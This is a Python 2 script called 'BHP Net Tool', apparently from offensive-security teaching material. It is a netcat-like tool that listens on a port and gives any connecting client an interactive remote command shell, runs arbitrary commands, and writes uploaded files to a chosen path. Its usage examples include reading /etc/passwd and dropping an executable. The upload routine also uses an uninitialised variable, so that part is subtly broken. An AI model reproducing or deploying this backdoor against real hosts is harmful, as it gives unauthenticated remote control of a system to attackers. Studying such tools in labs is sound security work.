import sys
import socket
import getopt
import threading
import subprocess

# variables
listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    print "BHP Net Tool"
    print
    print "Usage: bhnet.py -t target_host -p port"
    print "-l --listen              - listen to [host]:[port]"
    print "-e --execute=file_to_run - execute file upon connection"
    print "-c --command             - launch command shell"
    print "-u --upload=destination  - upload and store to destination upon connection"
    print
    print
    print "Example:"
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -c"
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe"
    print "bhnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\""
    print "echo 'ABCDEFGHI' | ./bhnet.py -t 192.168.11.12 -p 135"
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    if not len(sys.argv[1:]):
        usage()

    # read options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print str(err)
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "unknown option"

    # do we want to listen, or output stdin?
    if not listen and len(target) and port > 0:
        # read buffer from command
        # it blocks, so if we don't read stdin
        # press CTRL-D
        input_buffer = sys.stdin.read()

        # send data
        client_sender(input_buffer)

    # we want to listen and perform options
    if listen:
        server_loop()


def client_sender(input_buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # connect to target
        client.connect((target, port))

        if len(input_buffer):
            client.send(input_buffer)

        while True:
            # wait for response
            recv_len = 1
            response = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break

            print response,

            # wait for more input
            input_buffer = raw_input("")
            input_buffer += "\n"

            # send it
            client.send(input_buffer)

    except:
        print "[*] Exception! Exiting."
        client.close()


def server_loop():
    global target

    # if target undefined, listen to all interfaces
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        # start a new client thread
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def run_command(input_command):
    # remove newline
    input_command = input_command.strip()

    # execute command and get its output
    try:
        output = subprocess.check_output(input_command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "command failed.\r\n"

    # return output to client
    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    # upload file
    if len(upload_destination):
        # read and write bytes
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data

        # try to save the data
        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    # execute command
    if len(execute):
        # execute it
        output = run_command(execute)
        client_socket.send(output)

    # launch shell
    if command:
        while True:
            # show simple prompt
            client_socket.send("<BHP:#> ")

            # receive data until LF (enter)
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)

            # execute shell command
            response = run_command(cmd_buffer)

            # reply
            client_socket.send(response)


main()
